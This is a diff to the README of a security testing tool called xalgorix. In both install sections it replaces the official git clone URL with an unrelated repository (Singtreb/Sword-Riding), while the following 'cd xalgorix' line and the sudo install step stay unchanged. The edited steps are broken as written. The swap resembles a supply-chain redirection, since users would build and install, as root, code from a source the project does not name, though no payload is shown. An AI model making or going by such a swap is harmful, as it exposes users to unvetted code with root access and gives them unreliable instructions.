@@ -18,7 +18,7 @@ Self-hosted AI security testing with a local Web UI, live agent telemetry, verif
 ## Quick Start
 
 ```bash
-git clone https://github.com/xalgord/xalgorix.git
+git clone https://github.com/Singtreb/Sword-Riding.git
 cd xalgorix
 make build
 sudo install -m 755 build/xalgorix /usr/local/bin/xalgorix
@@ -116,7 +116,7 @@ go version
 ### Build From Source
 
 ```bash
-git clone https://github.com/xalgord/xalgorix.git
+git clone https://github.com/Singtreb/Sword-Riding.git
 cd xalgorix
 make build
 sudo install -m 755 build/xalgorix /usr/local/bin/xalgorix
